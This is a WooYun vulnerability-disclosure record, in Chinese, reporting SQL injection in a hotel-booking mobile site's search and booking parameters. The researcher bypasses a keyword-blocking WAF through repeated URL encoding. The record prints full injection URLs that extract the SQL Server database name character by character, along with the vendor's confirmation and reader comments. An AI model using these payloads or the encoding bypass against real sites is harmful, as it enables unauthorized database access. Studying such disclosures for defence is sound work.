{"id": 44082, "wybug_id": "wooyun-2015-0102589", "wybug_title": "住哪网某站点绕过WAF继续SQL注入", "wybug_corp": "住哪网", "wybug_author": "梧桐雨", "wybug_date": "2015-03-20 15:07", "wybug_open_date": "2015-05-04 15:16", "wybug_type": "", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-04：\t细节向公众公开  简要描述： 过程还是有点意思，权当积累案例。 详细说明：  问题出在住哪儿网手机站：http://m.zhuna.cn/注入点：http://m.zhuna.cn/wap/index.php/index/hotelSearch?city=x一开始丢到sqlmap跑，得到结果是sql server 我还不信。。因为这网站是php的。。结果后面注入出来结果还真的是。。让我无语了。http://m.zhuna.cn/wap/index.php/index/hotelSearch?city=x' 报错：\n\n\n\n悲催，被拦截了。测试发现最后结尾是带and or select 全部被拦截了。后面测试发现order by 可以查询字段，这个没有过滤。3个字段，是正确的\n\n4个就错误了\n\n但是不能select，怎么查呢，发现url编码2次以上不会再拦截，如图所示：多次编码之后：\n\nand 1=1 and 1=2结果不一，再次证明可以注入\n\n\n\n测试version() user() database()发现不存在这些内置函数，最后一个一个测试，发现还是sqlserver 。。db_name长度14\n\n以此类推http://m.zhuna.cn/wap/index.php/index/hotelSearch?city=x%27%20and%20substring((select%20db_name()),1,1)=%27H%27%20and%2520%25271%2527%3d%25271首字母Hhttp://m.zhuna.cn/wap/index.php/index/hotelSearch?city=x%27%20and%20substring((select%20db_name()),2,1)=%27O%27%20and%2520%25271%2527%3d%25271注出数据库name为：HOTEL_9TOURCN   漏洞证明：  都在上面了还有一处注入存在：http://m.zhuna.cn/wap/index.php/index/ydHotel?backurl=http://m.zhuna.cn/wap/index.php/index/getHotelInfo/135979/2015-03-20/2015-03-21?type=1&end=&hotelid=1%27%20and%201=1&iscard=0&pid=334190&rid=686742&stat=&tm1=2015-03-20&tm2=2015-03-21hotelid 注入点，也过滤下。   修复方案：  过滤参数city，hotelid   版权声明：转载请注明来源 梧桐雨@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-03-20 15:14 厂商回复： 非常感谢您反馈的信息，相关问题已交技术处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-20 18:01 |    \t\t苏泽 \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:19        | 大习科。)\t\t \n  住哪网某站点绕过WAF继续SQL注入    \n     2015-05-04 21:27 |    \t\t甲鱼 \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:3        | 慢慢爬……)\t\t \n  没测试，看URI结构和报错页面，后台PHP框架是CodeIgniter，所以不一定是WAF，而是CodeIgniter框架的 ActiveRecord 类方法做的安全查询，但部分数据库操作为了偷懒没使用CI的 AR 类方法，才导致注入    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}